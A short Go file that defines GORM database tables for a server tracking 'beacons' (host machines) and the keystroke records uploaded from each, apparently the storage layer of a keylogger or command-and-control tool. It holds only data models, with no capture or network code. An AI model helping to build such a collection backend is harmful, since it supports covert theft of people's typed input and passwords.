package database

//// device_info表
//type DeviceInfo struct {
//	DeviceID   string `gorm:"primaryKey"`
//	DeviceName string
//}
//
//// data表
//type Data struct {
//	Timestamp       int64 `gorm:"primaryKey"`
//	KeystrokeRecord string
//}

// Server端有两个表，一个表存储有哪些宿主机器，另一个表存储每个宿主机器的数据

// 存储有哪些宿主机器
type Beacon struct {
	DeviceID       string `gorm:"primaryKey"`
	DeviceName     string
	RegisterTime   int64 // 最初上传时间
	LastUpdateTime int64 // 最后更新时间
}

// 存储每个宿主机器的数据
type BeaconData struct {
	Timestamp       int64 `gorm:"primaryKey"`
	KeystrokeRecord string
	BeaconID        string // foreignKey
	Beacon          Beacon
}
